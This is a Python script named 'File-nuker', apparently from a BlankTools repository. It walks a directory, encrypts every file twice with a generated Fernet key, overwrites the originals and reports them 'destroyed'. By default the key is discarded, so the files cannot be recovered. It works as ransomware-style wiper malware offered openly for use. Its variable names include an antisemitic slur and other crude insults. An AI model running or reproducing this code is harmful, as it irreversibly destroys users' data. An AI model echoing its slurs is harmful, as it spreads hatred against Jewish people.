from os import walk as dihnihmodule
import os 
from cryptography.fernet import Fernet as epsteinblud
"""
                                            ████████ ██████   ██████  ███    ███  ██████  ███████ ███    ███                                             
                                               ██    ██   ██ ██    ██ ████  ████ ██    ██ ██      ████  ████                                             
                                               ██    ██████  ██    ██ ██ ████ ██ ██    ██ ███████ ██ ████ ██                                             
                                               ██    ██   ██ ██    ██ ██  ██  ██ ██    ██      ██ ██  ██  ██                                             
                                               ██    ██   ██  ██████  ██      ██  ██████  ███████ ██      ██                                             
                                                                                                                                                         

Repo :  tromoSM/BlankTools/
Forked : false
Name : File-nuker
Version : V1.0st
Release-description : default
Author : tromoSM
User preferences : var(path) var(iKnowWhatImDoing)
"""     
iKnowWhatImDoing=True
ThedamnKey = epsteinblud.generate_key()
isithardtofindthis =epsteinblud(ThedamnKey)
path="C:/Users/TromoSM/BlankTools/Files"
encoder="UTF=8"
fuckallthejews=[]
for (dirpaths,dirnames,filenames) in dihnihmodule(path)  :
   fuckallthejews.extend(filenames)
ifucker=0
for ifucker in range (len(fuckallthejews)):
 filenameahh=fuckallthejews[ifucker]    
 filefucker=f"{path}{filenameahh}"
 with open(filefucker, "r",  encoding="UTF-8",errors="ignore") as dawgdih :
  fuckyou=dawgdih.read() 
  dawgdih.close()
 utfnih=isithardtofindthis.encrypt(fuckyou.encode())
 if os.path.exists(f"{path+filenameahh}.dih"): 
    os.remove(f"{path+filenameahh}.dih")
 with open(filefucker,"wb") as calvinharrisdih :
     calvinharrisdih.write(utfnih)

 with open(f"{path+filenameahh}", "r", encoding="UTF-8",errors="ignore") as dihdihobama :
  fuckyoudoublefucker=dihdihobama.read() 
  dihdihobama.close()
 brrruhfuh=isithardtofindthis.encrypt(fuckyoudoublefucker.encode())

 with open(f"{path+filenameahh}","wb") as calvinharrisdihdih : 
    calvinharrisdihdih.write(brrruhfuh)
    calvinharrisdihdih.close()
    print(f'destroyed {filenameahh}')
 ifucker+=1

if(iKnowWhatImDoing==False):
  if os.path.exists(f"{path}recovery.txt"):
    os.remove(f"{path}recovery.txt")
  with open(f"{path}recovery.txt","w",encoding="UTF-8") as obamatypshit :
   obamatypshit.write(f'Recovery key : {ThedamnKey}')
   reckdic=True
else:
   reckdic=False

print(f'''
                                  ┳┓┓    ┓ ┏┳┓    ┓   ┓               ┏┓┳┳┓
                                  ┣┫┃┏┓┏┓┃┏ ┃ ┏┓┏┓┃┏  ┣┓┓┏  ╋┏┓┏┓┏┳┓┏┓┗┓┃┃┃
                                  ┻┛┗┗┻┛┗┛┗ ┻ ┗┛┗┛┗┛  ┗┛┗┫  ┗┛ ┗┛┛┗┗┗┛┗┛┛ ┗
                                                         ┛                 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
│ Files destroyed : {ifucker}\n│ Encoding used : {encoder}\n│ path : {path}\n│ Recovery file : {reckdic}\n│ Message : sorry for sliming out your files vro.''')
